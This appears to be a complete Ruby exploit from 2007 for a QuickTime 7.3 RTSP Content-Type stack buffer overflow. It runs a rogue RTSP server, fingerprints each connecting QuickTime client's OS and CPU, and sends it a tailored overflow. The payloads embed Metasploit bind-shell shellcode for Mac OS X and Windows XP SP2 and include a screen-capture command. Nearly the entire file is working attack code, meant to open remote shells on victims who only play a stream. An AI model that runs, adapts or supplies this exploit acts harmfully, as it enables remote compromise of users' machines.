# Copyright (C) 2007 Subreption LLC. All rights reserved.
# Visit http://blog.subreption.com for exploit development notes.
#
# References:
#   http://www.milw0rm.com/exploits/4648 (original Microsoft Windows code)
#   http://www.milw0rm.com/exploits/4651 (recent Microsoft Windows exploit)
#   From Metasploit: apple_quicktime_rtsp_response.rb (by MC and HD Moore)
#   http://nvd.nist.gov/nvd.cfm?cvename=CVE-2002-0252
#   BID: http://www.securityfocus.com/bid/26549
#
# Notes:
#   Payload badchars: \x00 \x09 \x0a \x0d \x20 \x22 \x25 \x26 \x27 \x2b \x2f
#                     \x3a \x3c \x3e \x3f \x40
#
#   The example addresses and data will trigger an IDS signature easily.
#   Remove them if you're not testing, and change padding sizes accordingly. 
#   Use the String.rand_alpha() method to generate random strings.
#
# Version: 1.0 (+leopard_ppc +leopard_x86 +tiger_x86 +tiger_ppc +win_xpsp2)
#
# We would like to thank...
#   Kevin Finisterre, for providing PowerPC testing environment and general
#   aid in the development and proofing of this code for Mac OS X on PPC.

#   HD Moore for his suggestions and Metasploit code.
#
# Distributed under the terms of the Subreption Open Source License v1.0
# http://static.subreption.com/public/documents/subreption-sosl-1.0.txt
#

require 'socket'
include Socket::Constants

def String.rand_alpha(size = 16)
  (1..size).collect { (i = Kernel.rand(62); i += ((i < 10) ? 48 : ((i < 36) ? 55 : 61 ))).chr }.join
end

module MiscUtils
  def self.myputs(msg)
    puts "#{$0}: #{msg}"
  end
  
  # From Metasploit Rex library:
  # http://metasploit.com/svn/framework3/trunk/lib/rex/arch/x86.rb
  def self.rel_number(num, delta = 0)
    s = num.to_s
    case s[0, 2]
      when '$+'
       num = s[2 .. -1].to_i
      when '$-'
       num = -1 * s[2 .. -1].to_i
      when '0x'
       num = s.hex
      else
       delta = 0
    end
    return num + delta
  end
end

# msf osx/x86/shell_bind_tcp - 81 bytes port=5354 + exit()
MSF_OSX_X86 =
"\x31\xc0\x50\x68\xff\x02\x14\xea\x89\xe7\x50\x6a\x01\x6a\x02\x6a" +
"\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x68\x58\xcd\x80\x89\x47\xec" +
"\xb0\x6a\xcd\x80\xb0\x1e\xcd\x80\x50\x50\x6a\x5a\x58\xcd\x80\xff" +
"\x4f\xe4\x79\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89" +
"\xe3\x50\x54\x54\x53\x50\xb0\x3b\xcd\x80\x31\xc0\x50\xb0\x01\xcd" +
"\x80"

# msf win32_bind - EXITFUNC=process LPORT=4444 Size=696 Encoder=Alpha2
MSF_WIN_X86 =
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x37\x49\x49\x49\x49" +
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x42" +
"\x58\x50\x30\x42\x31\x41\x42\x6b\x42\x41\x52\x32\x42\x42\x32\x41" +
"\x41\x30\x41\x41\x58\x42\x50\x38\x42\x42\x75\x39\x79\x4b\x4c\x61" +
"\x7a\x38\x6b\x50\x4d\x68\x68\x69\x69\x4b\x4f\x4b\x4f\x59\x6f\x53" +
"\x50\x4e\x6b\x32\x4c\x44\x64\x35\x74\x6e\x6b\x30\x45\x57\x4c\x4e" +
"\x6b\x41\x6c\x64\x45\x51\x68\x46\x61\x4a\x4f\x6c\x4b\x30\x4f\x46" +
"\x78\x6c\x4b\x71\x4f\x47\x50\x33\x31\x5a\x4b\x61\x59\x6e\x6b\x50" +
"\x34\x4e\x6b\x46\x61\x78\x6e\x50\x31\x69\x50\x4e\x79\x4e\x4c\x4b" +
"\x34\x6b\x70\x52\x54\x63\x37\x38\x41\x6a\x6a\x44\x4d\x63\x31\x6b" +
"\x72\x68\x6b\x49\x64\x77\x4b\x30\x54\x41\x34\x45\x78\x52\x55\x69" +
"\x75\x6e\x6b\x73\x6f\x75\x74\x56\x61\x7a\x4b\x33\x56\x4e\x6b\x36" +
"\x6c\x72\x6b\x4c\x4b\x53\x6f\x35\x4c\x77\x71\x38\x6b\x47\x73\x44" +
"\x6c\x6e\x6b\x4b\x39\x32\x4c\x35\x74\x77\x6c\x65\x31\x69\x53\x56" +
"\x51\x49\x4b\x65\x34\x4e\x6b\x67\x33\x34\x70\x4c\x4b\x77\x30\x74" +
"\x4c\x6e\x6b\x64\x30\x47\x6c\x4c\x6d\x6e\x6b\x41\x50\x63\x38\x53" +
"\x6e\x70\x68\x4e\x6e\x62\x6e\x56\x6e\x38\x6c\x52\x70\x6b\x4f\x7a" +
"\x76\x72\x46\x61\x43\x43\x56\x52\x48\x77\x43\x64\x72\x51\x78\x71" +
"\x67\x50\x73\x70\x32\x71\x4f\x31\x44\x4b\x4f\x4a\x70\x75\x38\x78" +
"\x4b\x68\x6d\x49\x6c\x75\x6b\x46\x30\x4b\x4f\x79\x46\x53\x6f\x6f" +
"\x79\x38\x65\x73\x56\x4c\x41\x58\x6d\x64\x48\x65\x52\x72\x75\x32" +
"\x4a\x73\x32\x49\x6f\x4a\x70\x33\x58\x78\x59\x63\x39\x39\x65\x4c" +
"\x6d\x72\x77\x6b\x4f\x6e\x36\x50\x53\x52\x73\x51\x43\x70\x53\x33" +
"\x63\x71\x53\x63\x63\x61\x53\x33\x63\x4b\x4f\x5a\x70\x73\x56\x51" +
"\x78\x37\x61\x41\x4c\x50\x66\x53\x63\x6c\x49\x5a\x41\x5a\x35\x51" +
"\x78\x4d\x74\x67\x6a\x30\x70\x4b\x77\x66\x37\x79\x6f\x4b\x66\x41" +
"\x7a\x32\x30\x72\x71\x33\x65\x59\x6f\x38\x50\x70\x68\x6f\x54\x6e" +
"\x4d\x64\x6e\x38\x69\x32\x77\x4b\x4f\x4e\x36\x51\x43\x41\x45\x39" +
"\x6f\x4a\x70\x71\x78\x4a\x45\x71\x59\x6d\x56\x43\x79\x76\x37\x4b" +
"\x4f\x39\x46\x52\x70\x72\x74\x46\x34\x31\x45\x4b\x4f\x68\x50\x4e" +
"\x73\x43\x58\x6b\x57\x71\x69\x6f\x36\x53\x49\x76\x37\x6b\x4f\x38" +
"\x56\x71\x45\x6b\x4f\x48\x50\x35\x36\x70\x6a\x31\x74\x45\x36\x31" +
"\x78\x62\x43\x32\x4d\x6f\x79\x7a\x45\x71\x7a\x30\x50\x33\x69\x46" +
"\x49\x6a\x6c\x6b\x39\x6a\x47\x73\x5a\x51\x54\x6f\x79\x6d\x32\x30" +
"\x31\x59\x50\x38\x73\x4d\x7a\x59\x6e\x43\x72\x36\x4d\x69\x6e\x73" +
"\x72\x54\x6c\x6f\x63\x4c\x4d\x72\x5a\x74\x78\x4c\x6b\x6c\x6b\x6e" +
"\x4b\x35\x38\x50\x72\x6b\x4e\x4c\x73\x64\x56\x4b\x4f\x43\x45\x32" +
"\x64\x79\x6f\x7a\x76\x33\x6b\x32\x77\x62\x72\x63\x61\x33\x61\x30" +
"\x51\x30\x6a\x53\x31\x71\x41\x46\x31\x52\x75\x32\x71\x6b\x4f\x4e" +
"\x30\x70\x68\x4e\x4d\x7a\x79\x46\x65\x4a\x6e\x72\x73\x69\x6f\x58" +
"\x56\x72\x4a\x69\x6f\x69\x6f\x66\x57\x39\x6f\x58\x50\x4c\x4b\x41" +
"\x47\x6b\x4c\x6c\x43\x4f\x34\x32\x44\x4b\x4f\x68\x56\x76\x32\x4b" +
"\x4f\x4e\x30\x71\x78\x33\x4e\x6a\x78\x49\x72\x43\x43\x61\x43\x4b" +
"\x4f\x48\x56\x69\x6f\x6a\x70\x42"

module AppleOSX
class QuicktimeRedux
  TARGET_MATRIX = {
    # Mac OS X Leopard on PowerPC (ppc)
    "7.3-Mac 10.5.1-PPC" => {
      # Stack on PPC is still executable
      :ret_address  => 0xbfffcb0c+50,
      :padding_size => 559,
      
      # Shellcode will -likely- require changes here
      :prepend_data => (
        [0xdead5841].pack("N") +  # r22
        [0xdead5842].pack("N") +  # r23
        [0xdead4141].pack("N") +  # r24
        [0xdead4142].pack("N") +  # r25
        [0xdead4143].pack("N") +  # r26
        [0xdead4144].pack("N") +  # r27
        [0xdead4145].pack("N") +  # r28
        [0xdead4146].pack("N") +  # r29
        [0xdead4147].pack("N") +  # r30
        [0xdead4148].pack("N") +  # r31
        [0xdead4150].pack("N") +  #
        [0xdead4151].pack("N") +  #
        [0xdead4152].pack("N") +  # at $sp+0
        [0xdead4153].pack("N")    # at $sp+4
      ),
      :append_data  => (""),
      :shellcode    => ( "\x69" * 120 )
    },
    
    # Mac OS X Leopard on IA32 (x86) build 9B18
    "7.3-Mac 10.5.1-IA32" => {
      # Return-to-dyld stub is not reliable unless the machine
      # hasn't randomized the dyld base address.
      :ret_address  => 0xdeadbeef,
      :padding_size => 291,
      :prepend_data => (
        [0x11223344].pack("V")  +      # ebx
        [0x41424142].pack("V")  +      # esi
        [0x31337666].pack("V")  +      # edi
        [0xdefacedd].pack("V")         # ebp
      ),
      :append_data  => (
        [0xa0a7e44a].pack("V")  +      # to dyld_stub_exit
        [0xbffffaa3].pack("V")         # address to /bin/bash
      ),
      
      :shellcode    => (
        "screencapture -S ~/Desktop/US.png; exit;" +
        ("\x90" * 130) + MSF_OSX_X86
      )
    },
    
    # Mac OS X Tiger on IA32 (x86) build 8S2167 (10.4.11)
    # Apparently, it advertises 10.4.9 instead of 10.4.11
    "7.3-Mac 10.4.9-IA32" => {
      # Return-to-dyld stub works reliably on Tiger
      # 0xa0be2280 for dyld_stub_system
      :ret_address  => 0xa0be2280,
      :padding_size => 291,
      :prepend_data => (
        [0x917f1413].pack("V")  +      # ebx
        [0xffffeae6].pack("V")  +      # esi
        [0x14533050].pack("V")  +      # edi
        [0xbfffd27c].pack("V")         # ebp
      ),
      
      # exit() stub is problematic with some atexit code
      # because of corrupted frames, we use abort() instead.
      # A /bin/bash string (from env) is usually at 0xbffffc23
      # when running under gdb, or 0xbffffe5c if started
      # via dock. If started from Terminal, it's at 0xbffffc3e.
      :append_data  => (
        [0xa0815587].pack("V")  +      # to dyld_stub_abort
        [0xbffffc3e].pack("V")         # address system() command
      ),
      
      # NOP sled + Metasploit shellcode + NOP sled + int3
      :shellcode    => (
        ("\x90" * 140) + MSF_OSX_X86 + ("\x90" * 30) + "\xcc"
      )
    },
    
    # Mac OS X Tiger on PowerPC (PPC)
    # It also advertises 10.4.9 instead of 10.4.11
    "7.3-Mac 10.4.9-PPC" => {
      # Stub address for system() contains a null byte.
      # system() address contains filtered char.
      :ret_address  => 0xdeadbeef,
      :padding_size => 559,
      :prepend_data => (
        [0xdead5841].pack("N") +  # r22
        [0xdead5842].pack("N") +  # r23
        [0xdead4141].pack("N") +  # r24
        [0xdead4142].pack("N") +  # r25
        [0xdead4143].pack("N") +  # r26
        [0xdead4144].pack("N") +  # r27
        [0xdead4145].pack("N") +  # r28
        [0xdead4146].pack("N") +  # r29
        [0xdead4147].pack("N") +  # r30
        [0xdead4148].pack("N") +  # r31
        String.rand_alpha(16)
      ),
      :append_data  => (
        [0x942bce80].pack("N")  + # to dyld_stub_abort
        [0x58585858].pack("N")
      ),
      :shellcode    => (
        "\x69" * 120
      )
    },
    
    # Microsoft Windows targets
    
    # 7.3 on XP SP2, based on the original Metasploit module by MC
    # This one is elegant and reliable :)
    # (uses address from QuickTimeStreaming.qtx version 7.3.0.70)
    "7.3-Windows NT 5.1Service Pack 2-IA32" => {
      # pop esi; pop ebx; ret
      :ret_address  => 0x67644297,
      :padding_size => 991+MSF_WIN_X86.size,
      :prepend_data => (
        "\xeb" + [MiscUtils::rel_number(6, -2)].pack("V")[0,1] +
        "\x90\x90"
      ),
      :append_data  => ( String.rand_alpha(4092 - MSF_WIN_X86.size) ),
      :shellcode    => MSF_WIN_X86
    },
    
    # 7.3 on Vista
    # We are not including it yet, feel free to play around
    "7.3-Windows NT 6.0-IA32" => {
      :ret_address  => 0xdeadbeef,
      :padding_size => 991+MSF_WIN_X86.size,
      :prepend_data => (""),
      :append_data  => ( String.rand_alpha(4092 - MSF_WIN_X86.size) ),
      :shellcode    => MSF_WIN_X86
    }
  }
  
  # Generates headers for a Quicktime RTSP response, and injects
  # the payload into the Content-Type header (including the padding).
  def make_header(body_length, payload)
    "RTSP/1.0 200 OK\r\n"                           +
    "CSeq: 1\r\n"                                   +
    "Content-Base: rtsp://0.0.0.0/#{@mpfile}\r\n"  +
    "Content-Type: #{payload}\r\n"                  +
    "Content-Length: #{body_length}\r\n"            +
    "\r\n"
  end
  
  # Generates a body for a Quicktime RTSP response
  def make_body
    rand_str = String.rand_alpha(rand(10)+1)
    rand_nam = String.rand_alpha(rand(20)+1)
    "v=0\r\n"                                                   +
    "o=- #{rand(0xffffffff)} 1 IN IP4 0.0.0.0\r\n"              +
    "s=MPEG-1 or 2 Audio, streamed by #{rand_str}\r\n"          +
    "i=#{@mpfile}\r\n"                                          +
    "t=0 0\r\n"                                                 +
    "a=tool:#{rand_nam}\r\n"                                    +
    "a=type:broadcast\r\n"                                      +
    "a=control:*\r\n"                                           +
    "a=range:npt=0-213.077\r\n"                                 +
    "a=x-qt-text-nam:MPEG-1 or 2 Audio, streamed by #{rand_str}\r\n"  +
    "a=x-qt-text-inf:#{@mpfile}\r\n"                            +
    "m=audio 0 RTP/AVP 14\r\n"                                  +
    "c=IN IP4 0.0.0.0\r\n"                                      +
    "a=control:track1\r\n"
  end
  
  # Construct a payload without filtered characters, for the target provided.
  # The information is extracted from the target matrix variable.
  def build_payload(target)
    target_name = "#{target[:version]}-#{target[:os]}-#{target[:arch]}"
    selected    = TARGET_MATRIX[target_name]
    unless selected
      MiscUtils::myputs "Target not available, check User-Agent format!"
       MiscUtils::myputs target_name
      return ''
    end
    
    MiscUtils::myputs "Building payload for '#{target_name}'..."
    MiscUtils::myputs "Return address: #{sprintf("0x%08x",selected[:ret_address])}, " +
                      "shellcode: #{selected[:shellcode].size} bytes."
    
    payload = String.rand_alpha(selected[:padding_size]-selected[:shellcode].size)
    
    unless target[:os] =~ /Windows/
      payload << selected[:shellcode]
      payload << selected[:prepend_data]
      
      # Handle big-endian / little-endian
      if target[:arch] == "PPC"
        payload << [selected[:ret_address]].pack("N")
      else
        payload << [selected[:ret_address]].pack("V")
      end
    else
      payload << selected[:prepend_data]
      payload << [selected[:ret_address]].pack("V")
      payload << selected[:shellcode]
    end
    
    # Appended data comes always at end of payload
    payload << selected[:append_data]
    
    MiscUtils::myputs "Payload: #{payload.size} bytes (padding=#{payload[0,8]}...)"
    
    return payload
  end
  
  # Threaded 'listener': waits until a Quicktime client connects and fingerprints
  # its version, architecture and operating system version. Builds a response with
  # the correct payload and sends it back to the client.
  def exploit
    loop do
      socket = @server.accept
      Thread.start do
        s    = socket
        port = s.peeraddr[1]
        name = s.peeraddr[2]
        addr = s.peeraddr[3]
        
        MiscUtils::myputs "RTSP Connection from #{name} (#{addr}:#{port})"
        
        request = s.recv(1024)
        # Verify it's Quicktime and not some other application
        # ie. QuickTime E-/7.3 (qtver=7.3;os=Windows NT 6.0)
        if request =~ /User-Agent: QuickTime/i
          target = Hash.new
          
          if request =~ /Windows/
            qtver = request.scan(/\(qtver=(.+?);os=(.+?)\)\r\n/).flatten
            target[:version] = qtver[0]
            target[:arch]    = "IA32"
            target[:os]      = qtver[1]
          else
            qtver = request.scan(/\(qtver=(.+?);cpu=(.+?);os=(.+?)\)\r\n/).flatten
            target[:version] = qtver[0]
            target[:arch]    = qtver[1]
            target[:os]      = qtver[2]
          end
          
          MiscUtils::myputs "RTSP Request from Quicktime: #{qtver[0]} on #{qtver[3]} #{qtver[2]}"
          
          # Build payload and the full response body
          begin
            payload = build_payload(target)
            body    = make_body()
            header  = make_header(body.size, payload)
            resp    = (header+body)
          rescue
            raise "Something happened trying to build a response!"
          end
          
          # Send it to the client
          s.write(resp)
          
          MiscUtils::myputs "RTSP Sent #{resp.size} bytes..."
        else
          # It's not a Quicktime client
          MiscUtils::myputs "RTSP Connection doesn't seem to come from Quicktime!"
          s.write(String.rand_alpha(rand(500)))
        end
      end
    end
  end
  
  # Initialize the exploit with the local listening port, server socket, etc.
  def initialize(rtsp_port = 554)
    @server = TCPServer.new("0.0.0.0", rtsp_port)
    @mpfile = String.rand_alpha(rand(12)+1) + '.mp3'
    
    rtsp_addrs  = @server.addr[2..-1].uniq.collect{|a|"#{a}:#{rtsp_port}"}.join(' ')
    MiscUtils::myputs "RTSP Listening on #{rtsp_addrs}, serving #{@mpfile}"
    MiscUtils::myputs "RTSP URL: rtsp://#{rtsp_addrs}/#{@mpfile}"
  end
end
end

trap("INT") do
  puts "Exiting!"
  exit
end

puts "Quicktime 7.3 RTSP Response Content-Type Header Stack Buffer Overflow exploit"
puts "Copyright (C) 2007, Subreption LLC. All rights reserved."
test_run = AppleOSX::QuicktimeRedux.new()
test_run.exploit

# milw0rm.com [2007-11-29]